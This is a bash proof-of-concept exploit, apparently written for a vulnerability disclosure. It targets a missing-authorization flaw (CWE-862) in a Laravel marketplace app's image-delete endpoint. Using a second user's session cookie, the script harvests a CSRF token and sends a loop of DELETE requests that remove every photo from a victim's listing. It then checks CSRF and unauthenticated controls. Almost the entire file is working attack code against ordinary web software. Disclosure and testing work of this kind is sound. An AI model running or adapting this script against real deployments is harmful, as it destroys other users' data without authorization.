#!/usr/bin/env bash
# PoC — MarketplaceKit: missing authorization in CreateController@deleteUpload (CWE-862)
#        DELETE /create/{listing}/image/{uuid?} - any verified user strips photos
#        from any other user's listing.
# Affects: master @ 534aa0eb9981a42115bb139f79ae5433b4483a05 (see TARGET-SOURCE.txt)
#
# Usage:
#   ./poc-delete-idor.sh http://<target> <ATTACKER_COOKIE_HEADER> <LISTING_HASHID> <MAX_INDEX>
#
#   ATTACKER_COOKIE_HEADER  cookie header of a SECOND, independent verified user
#                           session (the attacker) - e.g. "laravel_session=...; XSRF-TOKEN=..."
#   LISTING_HASHID          the Hashids token of the VICTIM's listing, taken from a
#                           public listing URL (tokens are per-instance app config)
#   MAX_INDEX               highest photos array index on the victim listing (0-based)
#
# Every verified session carries a CSRF token harvested from any page
# (X-CSRF-TOKEN header or XSRF-TOKEN cookie flow below - adjust to your build).

set -euo pipefail
TARGET="${1:?usage: $0 http://<target> '<attacker cookie header>' <listing-hashid> <max-index>}"
COOKIE="${2:?}"
HASHID="${3:?}"
MAXIDX="${4:?}"

# Harvest the CSRF token from any page as the attacker (standard Laravel web middleware).
CSRF=$(curl -s -H "Cookie: $COOKIE" "$TARGET/" | grep -oP 'name="csrf-token" content="\K[^"]+' | head -1)
[ -n "$CSRF" ] || { echo "could not harvest CSRF token - check the attacker session"; exit 1; }
echo "[*] CSRF token harvested as attacker."

for i in $(seq 0 "$MAXIDX"); do
  printf 'DELETE /create/%s/image/%s -> ' "$HASHID" "$i"
  curl -s -X DELETE "$TARGET/create/$HASHID/image/$i" \
    -H "Cookie: $COOKIE" \
    -H "X-CSRF-TOKEN: $CSRF" \
    -H 'X-Requested-With: XMLHttpRequest' \
    -w ' HTTP %{http_code}\n'
  # expected each time: {"success":true} HTTP 200
done

echo "[*] Verify from the victim's perspective: the listing edit page / public page"
echo "    no longer shows any photo (photos array was reduced to [] by the requests above)."

echo "[*] Controls:"
curl -s -o /dev/null -w '  authenticated DELETE without CSRF token -> HTTP %{http_code} (expect 419)\n' \
  -X DELETE "$TARGET/create/$HASHID/image/0" -H "Cookie: $COOKIE"
curl -s -o /dev/null -w '  unauthenticated DELETE                    -> HTTP %{http_code} (expect 419)\n' \
  -X DELETE "$TARGET/create/$HASHID/image/0"
